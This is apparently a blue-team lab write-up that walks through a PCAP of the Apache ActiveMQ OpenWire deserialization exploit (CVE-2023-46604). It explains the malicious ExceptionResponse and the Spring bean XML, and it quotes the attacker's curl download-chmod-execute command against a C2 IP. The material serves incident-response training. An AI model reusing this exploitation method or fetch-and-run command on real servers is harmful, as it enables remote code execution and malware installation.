OpenWire — Apache ActiveMQ RCE (CVE-2023-46604)

Scenario:

This lab explores an incident involving a public-facing server flagged by Tier-1 for suspicious outbound connections, and as a player you are going to act as a Tier-2 SOC Analyst.

we are provided with a zipped PCAP file, so we are going for WireShark to analyze it.

Questions:

  1. By identifying the C2 IP, we can block traffic to and from this IP, helping to contain the breach and prevent further data exfiltration?

starting to go through our packets, you can notice a handshake was initiated on port 61616, this is an unfimilliar service to me so ive done some research about it, it turns out it is used by Apache ActiveMQ by default, an opens source message broker, and communicates over OpenWire protocol.

in simple words, this broker work is to recieve messages from producers, place them in a queue, and when consumers connect to the port 61616, it serves them the message.

after that at packet 4 we notice that the server accepted the connection and proceeded to the WireFormat Negotiation step, where the version check and protocol confirmation happens.

then the most important packet: packet 5.

here we can see the attacker sending an ExceptionResponse command which looks sucpecious, opening the packet to check the details confirmed that :

The Exception here is a Throwable which is the parent of all errors, inside it there is the Java Class Name.

Why do we have to pass an error as an object ? bcs someone in the 90s thought everything should be a OO ig?

so in a normal case, we would recieve an error that belongs to the throwable class of errors, we will build the object passed in the Class field by calling its constructor, and pass it the Message as a parameter, and that class will take care of the rest

But yeah, whats you thinking of is exactly what happened, if you can pass an object as an error, and this protocol was built in the 90s so probably there is no strong security measure here, we can pass whatever we want in the class field !
Youre now meeting the crazy CVE-2023-46604 .

the attacker called ClassPathXmlApplicationContext, a class that also requires a one parameter in its constructor, and treats it as a url to call, which explains the Message part: a well crafted URL that calss the C2 server, exactly where it isserving the file invoice.xml, not just that, but this class also builds "beans" which are objects built based on XML files.

checking the file by extracting from File>Export Objects>HTTP>invoice.xml

Reading it we can find that it is indeed a malicious Spring Bean configuration, which tells the app to create an instance of ProcessBuilder which is used to create OS processes,
and passes the string:

***curl -s -o /tmp/docker http://128.199.52.72/docker; chmod +x /tmp/docker; ./tmp/docker***

To downlaod a malicious file from another ip of the C2 server: 128.199.52.72, make it executable and execute it.
